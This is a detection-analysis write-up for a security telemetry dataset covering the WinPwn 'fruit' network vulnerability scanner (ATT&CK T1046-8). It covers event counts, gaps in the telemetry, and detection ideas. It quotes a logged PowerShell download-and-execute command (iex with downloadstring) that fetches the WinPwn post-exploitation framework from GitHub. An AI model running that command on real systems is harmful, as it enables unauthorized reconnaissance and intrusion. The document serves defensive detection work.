# T1046-8: Network Service Discovery — WinPwn fruit

## Technique Context

T1046 Network Service Discovery covers the full spectrum of adversary techniques for enumerating accessible services on networked systems. WinPwn's `fruit` module performs vulnerability-specific network scanning within the broader WinPwn post-exploitation framework. The "fruit" name in WinPwn refers to hunting for "low-hanging fruit" — quickly-exploitable vulnerabilities and misconfigurations that can be turned into lateral movement or privilege escalation opportunities.

WinPwn's fruit module scans for a variety of common vulnerabilities and misconfigurations rather than a single CVE, making it a broader reconnaissance tool than the MS17-10 or bluekeep modules. It extends the discovery phase by identifying multiple potential attack vectors in a single scan pass. Like all WinPwn modules, it executes entirely in PowerShell's process space without spawning external processes, using .NET networking APIs for the actual network probing.

The consistent delivery mechanism across all WinPwn modules — `iex(new-object net.webclient).downloadstring(...)` against a raw GitHub URL — means detection at the download-and-execute layer covers the entire WinPwn toolkit regardless of which module is invoked.

## What This Dataset Contains

With Defender disabled, WinPwn downloaded and the fruit scanner executed. The telemetry structure is consistent with T1046-6 and T1046-7.

Security EID 4688 captures the invocation: `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') fruit -noninteractive -consoleoutput}`. The WinPwn commit `121dcee26a7aca368821563cbe92b2b5638c5773` is present here as in all other WinPwn tests in this batch.

Sysmon EID 1 provides process creation with parent context. The Sysmon channel has 22 EID 7 ImageLoad events (one more than T1046-6 and T1046-7), 4 EID 1 ProcessCreate, 4 EID 10 ProcessAccess, 3 EID 17 named pipe creation, 1 EID 22 DNS query, 1 EID 3 network connection, and 1 EID 11 file creation — the slightly higher ImageLoad count may reflect additional .NET assemblies loaded by the fruit module's broader scanning capability.

The Application channel carries the same EID 15 Defender status event: `Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON`.

The PowerShell channel has 110 EID 4104 and 1 EID 4103 events. Two additional script blocks are captured in the sampled events: `& {}` and `{}` — empty scriptblock executions that appear at the end of the WinPwn session as cleanup or module teardown. The cleanup block `try { Invoke-AtomicTest T1046 -TestNumbers 8 -Cleanup -Confirm:$false 2>&1 | Out-Null } catch {}` is captured in EID 4104 as in the other WinPwn tests.

Compared to the defended dataset (37 Sysmon, 10 Security, 51 PowerShell), the undefended run has fewer Sysmon events (36) but more PowerShell events (112). The defended run's additional Sysmon events likely reflect network connection events from Defender's cloud communication during the blocking sequence.

## What This Dataset Does Not Contain

The specific vulnerabilities and misconfigurations that `fruit` scans for are not enumerable from the telemetry — the scan targets and results exist only in WinPwn's in-memory operation. No EID 3 network connection events documenting the actual scan probes to various service ports appear in the 20-event Sysmon sample (the EID 3 event in the breakdown is for the GitHub download).

No EID 5379 Credential Manager events appear, consistent with the fruit module's focus on network vulnerability scanning rather than credential access.

The EID 11 file creation event's TargetFilename is not in the sampled events; it may represent a WinPwn temporary file or a PowerShell profile write.

## Assessment

This dataset completes the four-dataset WinPwn coverage series (T1046-5 through T1046-8). The fruit module test provides slightly more Sysmon ImageLoad diversity than the MS17-10 and bluekeep tests, reflecting the broader set of .NET networking components loaded for multi-target scanning. The empty scriptblock events (`& {}` and `{}`) captured in PowerShell EID 4104 are a minor but distinctive artifact of WinPwn's module teardown sequence.

Taken together, the four WinPwn datasets (T1046-5 through T1046-8) show that the primary differentiator between tests is the module name in the command line and, for T1046-5, the presence of Credential Manager read events from `spoolvulnscan`'s credential access behavior. The download-and-execute telemetry pattern is identical across all four.

## Detection Opportunities Present in This Data

1. Security EID 4688 or Sysmon EID 1 where `CommandLine` contains `fruit` alongside the WinPwn `downloadstring` URL — directly identifies the fruit module invocation.

2. WinPwn commit hash `121dcee26a7aca368821563cbe92b2b5638c5773` in any command line, script block, or network connection metadata — this single string covers all four WinPwn datasets and any other test using this framework version.

3. Sysmon EID 3 network connections from `powershell.exe` to multiple service ports (22, 23, 80, 443, 445, 3389, 5985, 8080) in rapid succession — the multi-port probe pattern of a generalist vulnerability scanner.

4. PowerShell EID 4104 empty scriptblock events (`& {}` or `{}`) following a session that downloaded a remote script via `downloadstring` — cleanup teardown pattern visible in WinPwn execution.

5. Sysmon EID 22 DNS query for `raw.githubusercontent.com` from a non-development endpoint where no software installation activity is occurring.

6. PowerShell EID 4103 module logging showing `net.webclient` object creation paired with `downloadstring` — captures the network download cmdlet invocation at the module layer.

7. Combination of Application EID 15 (Defender status change) with Security EID 4688 IEX activity within the same 60-second window — temporal correlation suggesting active attack during a Defender-disabled period.
